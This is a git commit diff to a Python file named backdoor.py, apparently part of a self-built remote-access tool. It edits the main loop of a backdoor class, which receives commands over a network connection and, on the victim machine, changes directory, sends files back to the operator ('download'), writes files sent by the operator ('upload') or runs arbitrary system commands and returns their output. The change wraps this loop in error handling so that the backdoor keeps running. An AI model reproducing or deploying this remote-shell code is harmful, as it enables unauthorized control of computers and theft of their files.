171ff466752d5b84f0acac75ab4a32a6d7ef2f24
Robert Paruch <roobbb@live.com>
2020-07-15 23:05:42 -0700

    Update backdoor.py

--- backdoor/backdoor.py
+++ backdoor/backdoor.py
@@ -48,21 +48,28 @@ class Backdoor:
     def run(self):
         while True:
             command = self.reliable_receive()  # str
-            if command[0] == 'exit':
-                self.connection.close()
-                exit()
-            elif command[0] == 'cd' and len(command) > 1:
-                command_result = self.change_working_directory_to(
-                    command[1])  # str
-            elif command[0] == 'download':
-                command_result = self.read_file(command[1])
-                command_result = command_result.decode()
-            elif command[0] == 'upload':
-                command_result = self.write_file(
-                    command[1], command[2])
-            else:
-                command_result = self.execute_system_command(command)  # bytes
-                command_result = command_result.decode(errors='replace')  # str
+
+            try:
+                if command[0] == 'exit':
+                    self.connection.close()
+                    exit()
+                elif command[0] == 'cd' and len(command) > 1:
+                    command_result = self.change_working_directory_to(
+                        command[1])  # str
+                elif command[0] == 'download':
+                    command_result = self.read_file(command[1])
+                    command_result = command_result.decode()
+                elif command[0] == 'upload':
+                    command_result = self.write_file(
+                        command[1], command[2])
+                else:
+                    command_result = self.execute_system_command(
+                        command)  # bytes
+                    command_result = command_result.decode(
+                        errors='replace')  # str
+            except Exception:
+                command_result = '[-] Error during command execution.'
+
             self.reliable_send(command_result)
 
 
